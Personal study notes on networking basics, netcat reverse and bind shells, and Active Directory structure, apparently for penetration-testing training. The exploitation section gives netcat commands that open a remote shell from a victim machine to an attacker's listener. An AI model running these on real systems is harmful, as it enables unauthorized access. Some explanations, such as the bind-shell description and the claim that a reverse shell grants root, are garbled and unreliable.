## MAC Address (Layer2 "Switching")
* Media Access Control, is the physical address, 00:0c:29:0a:05:49. The first 3 pairs of the address are know as identifires.
* NIC: Network Interface Controller

## TCP, UDP, Three-way handshake (Layer 4 "Transport")
* TCP: Transmission Control Protocol - connection orientated protocol
    * Three-way handshake = SYN > SYN ACK > ACK/RST
            * SYN = hello / send request
            * SYN ACK = hello back / ok, here's the port for the connection
            * ACK = let's talk / ok, connection to that IP on that specific port
            * RST = don't want to talk / reset, no connection

* UDP: User Datagram Protocol - connectionless protocol (DNS, VoIP, Streaming)

## Common Ports and Protocols

* UDP
    * DNS 53 - tcp and udp protocol
    * DHCP 67 68 - the server that associates an IP address at random (router proprieties, assigning from Layer 2 to Layer 3
    * TFTP 69 
    * SNMO 161 - simple network management protocol 

## OSI Model
* P = Layer 1 = Physical = Data cables
* D = Layer 2 = Data = MAC and Switches
* N = Layer 3 = Network = IP address, Routing
* T = Layer 4 = Transport = TCP/UDP
* S = Layer 5 = Session management
* P = Layer 6 = Presentation = Media, JPEG, MOV, MP4
* A = Layer 7 = Application = HTTP, SMTP

PDNTSPA = Please Do Not Throw Sausage Pizza Away

## Subnetting
* /32 = Locked IP range, 255.255.255.255

* /19 = 19x ones across the board with the sum of 19, 255.255.224.0

# Exploitation
## Reverse Shell

The reverse shell is the most typical exploit for gaining root access on a remote machine. We send a malicious pack to the victiom that contains a shell, the shell opens a designate port like 4444 on which we are listening. Once the connection is made, root access is granted. This type of exploit can be intercepted only by closely analysing the open ports on a machine. 4444 is normally a giveaway, but they can be 5555, or 63412 for that matter.
* nc = netcat, app in Kali
* -lvp = listening verbose port
* 4444 = is the typical port for listening
Example:
    * Attack machine:
        * nc -nvlp 4444
    * Victim machine:
        * nc 192.168.1.22 4444 -e /bin/bash
            * the IP address is the address of the attack machine
            * -e = execute
            * /bin/bash = offering the root access
    * Attack machine:
        * whoami = to find out if we have root access -> this should be the victim machine
        * hostname = to find out the host name -> this should be the victim machine

## Bind Shell

The Bind Shell is the opposite of a Reverse Shell, only that when the exploit is ran, it specifically sends a connection request to the attacker on a specific port. Again 4444 is used for a typical Pen Test but any other free port can be used. This method is used 5% of the time. This method needs particular Firewall configuration on the attackers router (PortForward, ecc.).
Bind Shell is used when Reverse Shell doesn't work, which is very rare.
Example:
    * Victim machine:
        * nc -nvlp 4444 -e /bin/bash
    * Attack machine
        * nc 192.168.1.22 4444

# Active Directory Hacking

## What is AD?
- Is like a "phonebook" that stores all kind of information, like computers, users, printers, etc.
- AD is developed by Microsoft and manage Windows Domain Networks.
- Kerberos is the ticket authenticator - Linux machines can auth to AD via RADIUS or LDAP.
- It covers over 95% of world companies use Windows AD in their networks.
- It's tested from inside the network.

## Physical Components of AD
- Domain Controller(DC) - the Head Server, the main component. If this server is compromised, all the other servers in the tree/forest are compromised.
    * it hosts the Directory Store
    * it host Kerberos
    * it does replication to another domain
    * it hosts Administrative access, User accounts and other network resources
- Data Store(DS) - it contains the database file and processes and manage directory information for users, services and applications.
    * it has the Ntds.dit file - very sensitive file, it's usually the goal of the test; it has all the password hashes
    * it's stored in the %SystemRoot%\NTDS folder on all domain controllers
    * it's accessible only via DC processes and protocols
## Logical Conponents of AD 
- AD DS Schema - this mainly enforces rules about object creation

- Domains - are used to group and manage objects in an organization (Cantoso.com)
    * administration qualities for applying policies to groups and objects
    * replication qualities for replicating data between domain controllers
    * authentication and authorization qualities that limit scope access to resources
- Trees - are a hierarchy of domains;
    * can have additional child domains (that makes it a forest)
    * by default it creates two-way transitive trust with other domains
- Forests - are more trees that are linked together
    * can share a common schema
    * can share a common configuration partition
    * can share a global catalog that enables searching
    * enables trust between all the linked domains
    * can share Enterprise Admins and Schema Admins groups
- OUS (organuizaztional containers)
    * manages collections of objects in a consistent way
    * it detelegates premissions to administer groups of objects
    * apply group policies
    

- Trusts (Crossdomains) - provide a mechanism for users to gain access to resources in another domain
